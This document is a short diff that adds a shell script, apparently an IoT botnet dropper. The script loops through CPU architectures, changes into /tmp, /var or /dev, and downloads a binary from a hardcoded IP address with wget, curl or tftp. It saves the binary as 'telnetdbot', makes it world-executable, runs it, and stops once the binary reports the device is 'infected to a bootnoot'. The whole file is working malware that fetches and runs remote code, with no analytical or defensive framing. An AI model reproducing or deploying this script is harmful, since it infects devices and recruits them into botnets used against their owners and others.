@@ -1,0 +1,18 @@
+binarys="mips mpsl x86 arm arm5 arm6 arm7 sh4 ppc arc"
+server_ip="50.3.182.152"
+binout="telnetdbot"
+exec="your device just got infected to a bootnoot"
+
+rm -rf $binout
+for arch in $binarys
+do
+rm -rf $arch
+cd /tmp || cd /var || cd /dev; wget http://$server_ip/$arch -O $binout || curl -O $binout http://$server_ip/$arch || tftp -g -l $binout -r $arch $server_ip
+chmod 777 $binout
+status=`./$binout $1`
+if [ "$status" = "$exec" ]; then
+	rm -rf $binout
+	break
+fi
+rm -rf $binout
+done
